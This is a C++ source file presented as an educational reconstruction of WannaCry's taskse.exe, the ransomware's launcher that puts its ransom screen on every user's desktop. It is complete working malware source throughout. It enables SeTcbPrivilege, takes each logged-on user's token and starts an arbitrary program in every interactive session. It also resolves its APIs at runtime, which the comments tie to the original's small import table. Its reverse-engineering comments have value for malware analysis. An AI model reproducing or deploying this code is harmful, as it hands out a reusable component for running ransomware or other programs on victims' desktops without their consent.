// taskse.exe — WannaCry session launcher (educational reconstruction): from a
// SYSTEM/service context it starts a program inside every interactive user's
// session, so the ransomware's UI actually appears on the logged-on desktop.
//

#include <windows.h>
#include <wtsapi32.h>   // WTS_SESSION_INFOA / WTSEnumerateSessionsA types only
                        // (header-only; the original imports no wtsapi32 code)
#include <stdlib.h>
// __p___argc / __p___argv are declared dllimport by mingw's stdlib.h and come
// from msvcrt — the same MSVCRT.dll functions the original binary imported.

// ---------------------------------------------------------------------------
// Every API below is resolved at runtime with GetProcAddress instead of being
// linked, keeping the import table down to KERNEL32 + MSVCRT (as in the
// original, which stored the API-name strings in .data and looked them up).
// ---------------------------------------------------------------------------

typedef BOOL (WINAPI *PFN_OpenProcessToken)(HANDLE, DWORD, PHANDLE);
typedef BOOL (WINAPI *PFN_LookupPrivilegeValueA)(LPCSTR, LPCSTR, PLUID);
typedef BOOL (WINAPI *PFN_AdjustTokenPrivileges)(HANDLE, BOOL, PTOKEN_PRIVILEGES,
                                                 DWORD, PTOKEN_PRIVILEGES, PDWORD);
typedef BOOL (WINAPI *PFN_DuplicateTokenEx)(HANDLE, DWORD, LPSECURITY_ATTRIBUTES,
                                            SECURITY_IMPERSONATION_LEVEL,
                                            TOKEN_TYPE, PHANDLE);
typedef BOOL (WINAPI *PFN_CreateProcessAsUserA)(HANDLE, LPCSTR, LPSTR,
                                                LPSECURITY_ATTRIBUTES,
                                                LPSECURITY_ATTRIBUTES, BOOL,
                                                DWORD, LPVOID, LPCSTR,
                                                LPSTARTUPINFOA,
                                                LPPROCESS_INFORMATION);
typedef DWORD (WINAPI *PFN_WTSGetActiveConsoleSessionId)(VOID);
typedef HANDLE (WINAPI *PFN_GetCurrentProcess)(VOID);
typedef BOOL (WINAPI *PFN_CloseHandle)(HANDLE);
typedef BOOL (WINAPI *PFN_CreateEnvironmentBlock)(LPVOID *, HANDLE, BOOL);
typedef BOOL (WINAPI *PFN_DestroyEnvironmentBlock)(LPVOID);
typedef BOOL (WINAPI *PFN_WTSQueryUserToken)(ULONG, PHANDLE);
typedef BOOL (WINAPI *PFN_WTSEnumerateSessionsA)(HANDLE, DWORD, DWORD,
                                                 PWTS_SESSION_INFOA *, PDWORD);
typedef void (WINAPI *PFN_WTSFreeMemory)(PVOID);

// GetProcAddress returns FARPROC; routing the cast through void* keeps
// -Wcast-function-type quiet on these deliberately-typed function pointers.
template <typename FN>
static inline FN dynproc(FARPROC fp)
{
    return reinterpret_cast<FN>(reinterpret_cast<void *>(fp));
}

// String constants. The original does not use C literals for these: they are
// raw byte sequences in .data, passed to GetProcAddress/LoadLibraryA. Two
// copies of the wtsapi32.dll name exist because LaunchInSession and the
// all-sessions enumerator load the library independently.
#define STR_WINSTA0_DEFAULT   "winsta0\\default"
#define STR_SETCB_PRIVILEGE   "SeTcbPrivilege"
#define STR_WTSQUERYUSERTOKEN "WTSQueryUserToken"
#define STR_WTSAPI32_LOWER    "wtsapi32.dll"       // loaded by LaunchInSession
#define STR_DESTROYENVBLOCK   "DestroyEnvironmentBlock"
#define STR_CREATEENVBLOCK    "CreateEnvironmentBlock"
#define STR_USERENV_DLL       "userenv.dll"
#define STR_CLOSEHANDLE       "CloseHandle"
#define STR_GETCURRENTPROCESS "GetCurrentProcess"
#define STR_WTSGETACTIVECSI   "WTSGetActiveConsoleSessionId"
#define STR_KERNEL32_DLL      "kernel32.dll"
#define STR_CREATEPROCASUSER  "CreateProcessAsUserA"
#define STR_DUPLICATETOKENEX  "DuplicateTokenEx"
#define STR_ADJUSTTOKENPRIV   "AdjustTokenPrivileges"
#define STR_LOOKUPPRIVVALA    "LookupPrivilegeValueA"
#define STR_OPENPROCESSTOKEN  "OpenProcessToken"
#define STR_ADVAPI32_DLL      "advapi32.dll"
#define STR_WTSFREEMEMORY     "WTSFreeMemory"
#define STR_WTSENUMSESSA      "WTSEnumerateSessionsA"
#define STR_WTSAPI32_UPPER    "Wtsapi32.dll"       // loaded by the enumerator

#define TOKEN_SELF_ACCESS 0x28  // = TOKEN_QUERY (0x8) | TOKEN_ADJUST_PRIVILEGES (0x20)
#define SW_SHOW_CMD        5    // SW_SHOW, hard-coded by the enumerator

// Writable copy of the interactive desktop name, handed to
// STARTUPINFOA.lpDesktop so the child process lands on the user's desktop.
static char g_winsta0_default[] = "winsta0\\default";

// GetModuleHandleA first, LoadLibraryA as fallback. The original inlines this
// pattern before each DLL resolution; a NULL return aborts the launch (-1).
static HMODULE GetOrLoadDllA(LPCSTR lpDllName)
{
    HMODULE h = GetModuleHandleA(lpDllName);
    if (h == NULL)
        h = LoadLibraryA(lpDllName);
    return h;
}

// ---------------------------------------------------------------------------
// Cleanup for LaunchInSession — plays the role of the original's __finally
// body. gcc has no __finally, so LaunchInSession calls this explicitly on
// every exit path; it runs exactly once per attempt and releases only what
// was successfully acquired (all handles start NULL for that reason).
// ---------------------------------------------------------------------------
static void CleanupSessionLaunch(
    LPPROCESS_INFORMATION       pPi,
    LPVOID                      lpEnvironment,
    HANDLE                      hDupToken,
    HANDLE                      hUserToken,
    HANDLE                      hSelfToken,
    PTOKEN_PRIVILEGES           pTpPrevious,
    PFN_AdjustTokenPrivileges   pfnAdjustTokenPrivileges,
    PFN_CloseHandle             pfnCloseHandle,
    PFN_DestroyEnvironmentBlock pfnDestroyEnvironmentBlock)
{
    if (pPi->hThread  != NULL)
        pfnCloseHandle(pPi->hThread);
    if (pPi->hProcess != NULL)
        pfnCloseHandle(pPi->hProcess);
    if (lpEnvironment != NULL)
        pfnDestroyEnvironmentBlock(lpEnvironment);
    if (hDupToken != NULL)
        pfnCloseHandle(hDupToken);
    if (hUserToken != NULL)
        pfnCloseHandle(hUserToken);
    if (hSelfToken != NULL) {
        // Re-apply the privilege state captured by the FIRST AdjustTokenPrivileges
        // call (saved in pTpPrevious): this switches SeTcbPrivilege back off in
        // our own token. Tidy opsec by the original author — the launcher does
        // not keep the privilege it borrowed.
        pfnAdjustTokenPrivileges(hSelfToken, FALSE, pTpPrevious,
                                 sizeof(TOKEN_PRIVILEGES), NULL, NULL);
        pfnCloseHandle(hSelfToken);
    }
}

// ---------------------------------------------------------------------------
// LaunchInSession — start one program in one specific logon session.
//   int __cdecl LaunchInSession(LPSTR lpApplicationName, DWORD dwSessionId,
//                               WORD wShowWindow, BOOL bWait)
// dwSessionId may be (DWORD)-1, meaning "whichever session owns the physical
// console right now". No exceptions, no RAII — plain C-style flow like the
// original. Returns 0 on success, -1 on failure: deliberately inverted from
// the usual BOOL, because the caller counts zero-returns as successful
// launches (see LaunchForAllSessions).
// ---------------------------------------------------------------------------
static int LaunchInSession(LPSTR lpApplicationName, DWORD dwSessionId,
                           WORD wShowWindow, BOOL bWait)
{
    // Every handle starts NULL so the single-pass cleanup can tell what was
    // actually acquired.
    HANDLE              hSelfToken   = NULL;  // our own process token
    HANDLE              hUserToken   = NULL;  // session user's token, via WTS
    HANDLE              hDup2        = NULL;  // primary-token duplicate (DuplicateTokenEx out)
    LPVOID              lpEnvironment= NULL;  // environment block built for the user
    PROCESS_INFORMATION Pi;
    int                 result;               // 0 = launched, -1 = failed

    ZeroMemory(&Pi, sizeof(Pi));

    // ---- resolve advapi32: token / privilege / process-creation APIs -------
    HMODULE hAdvapi32 = GetOrLoadDllA(STR_ADVAPI32_DLL);
    if (hAdvapi32 == NULL) return -1;
    PFN_OpenProcessToken pfnOpenProcessToken =
        dynproc<PFN_OpenProcessToken>(GetProcAddress(hAdvapi32, STR_OPENPROCESSTOKEN));
    PFN_LookupPrivilegeValueA pfnLookupPrivilegeValueA =
        dynproc<PFN_LookupPrivilegeValueA>(GetProcAddress(hAdvapi32, STR_LOOKUPPRIVVALA));
    PFN_AdjustTokenPrivileges pfnAdjustTokenPrivileges =
        dynproc<PFN_AdjustTokenPrivileges>(GetProcAddress(hAdvapi32, STR_ADJUSTTOKENPRIV));
    PFN_DuplicateTokenEx pfnDuplicateTokenEx =
        dynproc<PFN_DuplicateTokenEx>(GetProcAddress(hAdvapi32, STR_DUPLICATETOKENEX));
    PFN_CreateProcessAsUserA pfnCreateProcessAsUserA =
        dynproc<PFN_CreateProcessAsUserA>(GetProcAddress(hAdvapi32, STR_CREATEPROCASUSER));
    if (pfnOpenProcessToken       == NULL ||
        pfnLookupPrivilegeValueA  == NULL ||
        pfnAdjustTokenPrivileges  == NULL ||
        pfnDuplicateTokenEx       == NULL ||
        pfnCreateProcessAsUserA   == NULL)
        return -1;

    // ---- resolve kernel32: console-session lookup + generic handles --------
    HMODULE hKernel32 = GetOrLoadDllA(STR_KERNEL32_DLL);
    if (hKernel32 == NULL) return -1;
    PFN_WTSGetActiveConsoleSessionId pfnWTSGetActiveConsoleSessionId =
        dynproc<PFN_WTSGetActiveConsoleSessionId>(GetProcAddress(hKernel32, STR_WTSGETACTIVECSI));
    PFN_GetCurrentProcess pfnGetCurrentProcess =
        dynproc<PFN_GetCurrentProcess>(GetProcAddress(hKernel32, STR_GETCURRENTPROCESS));
    PFN_CloseHandle pfnCloseHandle =
        dynproc<PFN_CloseHandle>(GetProcAddress(hKernel32, STR_CLOSEHANDLE));
    if (pfnWTSGetActiveConsoleSessionId == NULL ||
        pfnGetCurrentProcess            == NULL ||
        pfnCloseHandle                  == NULL)
        return -1;

    // ---- resolve userenv: user environment-block builders ------------------
    HMODULE hUserenv = GetOrLoadDllA(STR_USERENV_DLL);
    if (hUserenv == NULL) return -1;
    PFN_CreateEnvironmentBlock pfnCreateEnvironmentBlock =
        dynproc<PFN_CreateEnvironmentBlock>(GetProcAddress(hUserenv, STR_CREATEENVBLOCK));
    PFN_DestroyEnvironmentBlock pfnDestroyEnvironmentBlock =
        dynproc<PFN_DestroyEnvironmentBlock>(GetProcAddress(hUserenv, STR_DESTROYENVBLOCK));
    if (pfnCreateEnvironmentBlock    == NULL ||
        pfnDestroyEnvironmentBlock   == NULL)
        return -1;

    // ---- resolve wtsapi32: WTSQueryUserToken, the session-token stealer ----
    HMODULE hWts = GetOrLoadDllA(STR_WTSAPI32_LOWER);
    if (hWts == NULL) return -1;
    PFN_WTSQueryUserToken pfnWTSQueryUserToken =
        dynproc<PFN_WTSQueryUserToken>(GetProcAddress(hWts, STR_WTSQUERYUSERTOKEN));
    if (pfnWTSQueryUserToken == NULL)
        return -1;

    // ---- main body (the original wraps all of this in __try/__finally;
    // ---- the CleanupSessionLaunch call at the bottom is the __finally) -----
    LUID             luid;             // LUID that names SeTcbPrivilege
    TOKEN_PRIVILEGES tp;               // requested state: enable SeTcbPrivilege
    TOKEN_PRIVILEGES tpPrev;           // receives the previous state, for restore
    DWORD            dwReturnLength;
    DWORD            dwActiveSession;
    STARTUPINFOA     si;

    result = -1;

    // Step 1: open our own process token so privileges can be adjusted.
    if (pfnOpenProcessToken(pfnGetCurrentProcess(), TOKEN_SELF_ACCESS,
                            &hSelfToken) == 0) {
        // failed — fall through to cleanup, result stays -1
    }
    // Step 2: resolve the LUID for SeTcbPrivilege ("act as part of the
    // operating system") — the privilege that lets us take any session's token.
    else if (pfnLookupPrivilegeValueA(NULL, STR_SETCB_PRIVILEGE, &luid) == 0) {
        // failed — fall through to cleanup, result stays -1
    }
    else {
        // Step 3: enable SeTcbPrivilege on our token, saving the previous
        // state in tpPrev. Only the BOOL return is checked — the
        // hold-but-disabled case (ERROR_NOT_ALL_ASSIGNED) is ignored; running
        // as SYSTEM we always have it.
        ZeroMemory(&tp, sizeof(tp));
        tp.PrivilegeCount = 1;
        tp.Privileges[0].Luid       = luid;
        tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
        ZeroMemory(&tpPrev, sizeof(tpPrev));
        dwReturnLength = 0;

        if (pfnAdjustTokenPrivileges(hSelfToken, FALSE, &tp,
                                     sizeof(TOKEN_PRIVILEGES),
                                     &tpPrev, &dwReturnLength) == 0) {
            // failed — fall through to cleanup, result stays -1
        }
        else {
            // Step 4: pick the target session. (DWORD)-1 is the sentinel for
            // "ask the kernel which session the physical console is on".
            if (dwSessionId == (DWORD)-1) {
                dwActiveSession = pfnWTSGetActiveConsoleSessionId();
                if (dwActiveSession == (DWORD)-1) {
                    result = 0;  // no interactive console session: nothing to
                                 // launch, and it still counts as success (0)
                    goto finally;
                }
            } else {
                dwActiveSession = dwSessionId;
            }

            // Step 5: steal the logged-on user's token for that session —
            // the call that needed SeTcbPrivilege in the first place.
            if (pfnWTSQueryUserToken(dwActiveSession, &hUserToken) == 0) {
                // failed — fall through to cleanup, result stays -1
            }
            // Step 6: duplicate it as a PRIMARY token with maximal access;
            // CreateProcessAsUserA refuses impersonation-level tokens.
            else if (pfnDuplicateTokenEx(hUserToken, MAXIMUM_ALLOWED, NULL,
                                         SecurityIdentification, TokenPrimary,
                                         &hDup2) == 0) {
                // failed — fall through to cleanup, result stays -1
            }
            else {
                // Step 7: aim the child at the user's desktop. dwFlags stays
                // 0, which makes the wShowWindow store a dead write in the
                // original — mirrored here for fidelity.
                ZeroMemory(&si, sizeof(si));
                si.cb         = sizeof(si);
                si.lpDesktop  = g_winsta0_default;
                si.wShowWindow = wShowWindow;

                // Step 8: build a fresh user environment block from the token.
                if (pfnCreateEnvironmentBlock(&lpEnvironment, hDup2, TRUE) == 0) {
                    // failed — fall through to cleanup, result stays -1
                }
                // Step 9: the launch itself — lpApplicationName form (no
                // command line, so no quoting/merging games), no handle
                // inheritance, Unicode environment from the block above.
                else if (pfnCreateProcessAsUserA(
                             hDup2,                // token to run under
                             lpApplicationName,    // program to start
                             NULL,                 // no separate command line
                             NULL,                 // default process security
                             NULL,                 // default thread security
                             FALSE,                // do not inherit handles
                             CREATE_UNICODE_ENVIRONMENT,
                             lpEnvironment,        // user environment block
                             NULL,                 // no explicit working dir
                             &si,                  // desktop + startup info
                             &Pi) == 0) {
                    // failed — fall through to cleanup, result stays -1
                }
                else {
                    // Launched. Optionally block until the child exits.
                    if (bWait)
                        WaitForSingleObject(Pi.hProcess, INFINITE);
                    result = 0;                   // SUCCESS -> 0
                }
            }
        }
    }

finally:
    // __finally equivalent: release thread/process handles, environment
    // block, both tokens, and switch SeTcbPrivilege back off.
    CleanupSessionLaunch(&Pi, lpEnvironment, hDup2, hUserToken, hSelfToken,
                         &tpPrev, pfnAdjustTokenPrivileges, pfnCloseHandle,
                         pfnDestroyEnvironmentBlock);
    return result;                    // 0 = launched, -1 = failed
}

// ---------------------------------------------------------------------------
// LaunchForAllSessions — the all-sessions enumerator.
//   int __cdecl LaunchForAllSessions(LPCSTR lpCommandLine)
// Asks WTS for every session on the local terminal server and launches the
// program in each one on its interactive desktop. Returns -1 only if the WTS
// plumbing itself fails; otherwise the count of LaunchInSession calls that
// returned 0 (successes — see the inverted-return note above). That count
// becomes the process exit code.
// ---------------------------------------------------------------------------
static int LaunchForAllSessions(LPCSTR lpCommandLine)
{
    // Loads its own copy of wtsapi32 — the second, differently-capitalized
    // "Wtsapi32.dll" string — independent of LaunchInSession's resolution.
    HMODULE hWts = LoadLibraryA(STR_WTSAPI32_UPPER);
    if (hWts == NULL)
        return -1;

    PFN_WTSEnumerateSessionsA pfnWTSEnumerateSessionsA =
        dynproc<PFN_WTSEnumerateSessionsA>(GetProcAddress(hWts, STR_WTSENUMSESSA));
    if (pfnWTSEnumerateSessionsA == NULL)
        return -1;

    PFN_WTSFreeMemory pfnWTSFreeMemory =
        dynproc<PFN_WTSFreeMemory>(GetProcAddress(hWts, STR_WTSFREEMEMORY));
    if (pfnWTSFreeMemory == NULL)
        return -1;

    // Enumerate every session on the local server (level 1).
    PWTS_SESSION_INFOA pSessions = NULL;
    DWORD              dwCount    = 0;
    pfnWTSEnumerateSessionsA(NULL, 0, 1, &pSessions, &dwCount);
    // Only the out-pointer is checked; the BOOL return is discarded.
    if (pSessions == NULL)
        return -1;

    int  cLaunched = 0;                       // sessions launched successfully
    DWORD i;

    // pSessions is a plain array of WTS_SESSION_INFOA records (0x0C-byte
    // stride, SessionId in the first DWORD). Launch with SW_SHOW, don't wait,
    // and pace the launches 100 ms apart.
    for (i = 0; i < dwCount; i++) {
        if (LaunchInSession((LPSTR)lpCommandLine, pSessions[i].SessionId,
                            SW_SHOW_CMD, FALSE) == 0)
            cLaunched++;                      // LaunchInSession's 0 = success
        Sleep(100);
    }

    pfnWTSFreeMemory(pSessions);
    return cLaunched;                         // exit code = number of launches
}

// ---------------------------------------------------------------------------
// WinMain — entry point. The original ignores the four WinMain arguments and
// reads __p___argc/__p___argv directly:
//   argc < 2   -> return 0 (nothing to launch)
//   otherwise  -> LaunchForAllSessions(argv[1])
// Caller contract (the payload DLL's launcher routine): it spawns
// "taskse.exe <path>" where <path> is the absolute path of @WanaDecryptor@.exe,
// putting the decryptor/UI on every interactive desktop.
// ---------------------------------------------------------------------------
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
                   LPSTR lpCmdLine, int nCmdShow)
{
    (void)hInstance; (void)hPrevInstance; (void)lpCmdLine; (void)nCmdShow;

    if (*__p___argc() < 2)
        return 0;
    char **argv = *__p___argv();
    return LaunchForAllSessions(argv[1]);
}

// ---------------------------------------------------------------------------
// Not reconstructed: the CRT boilerplate the toolchain provides (GUI app-type
// setup, _initterm, __getmainargs, GetStartupInfoA, exit handling, _controlfp,
// the matherr stub, jmp thunks) — mingw emits functionally identical code.
//
// Not reconstructed because it is not code or data: the "PADDINGXX..." run at
// file offsets 0x4414-0x5000 is the MSVC linker's 0x50 ('P') padding bytes
// filling the .rsrc tail beyond its VirtualSize. It is never mapped, has zero
// cross-references, and is not a key — early analysts mistook it for an
// embedded XOR key, but taskse.exe decrypts nothing.
// ---------------------------------------------------------------------------
